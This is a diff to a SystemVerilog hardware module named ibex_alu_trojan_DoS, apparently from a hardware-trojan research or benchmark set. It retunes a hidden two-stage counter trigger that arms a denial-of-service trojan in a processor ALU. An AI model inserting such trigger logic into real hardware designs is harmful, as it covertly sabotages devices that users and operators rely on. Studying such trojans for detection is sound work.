@@ -33,13 +33,12 @@ module ibex_alu_trojan_DoS #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=6744, act=3372)
     // ============================================================
-    localparam int ARM_THRESHOLD = 6393;
-    localparam int ACTIVATE_DELAY = 3196;
+    localparam int ARM_THRESHOLD   = 6744;
+    localparam int ACTIVATE_DELAY  = 3372;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge instr_first_cycle_i) begin
         if (!instr_first_cycle_i) begin
             trojan_counter1 <= '0;
@@ -47,9 +46,9 @@ module ibex_alu_trojan_DoS #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && fires) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && imd_val_we_o) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && fires) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && imd_val_we_o) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
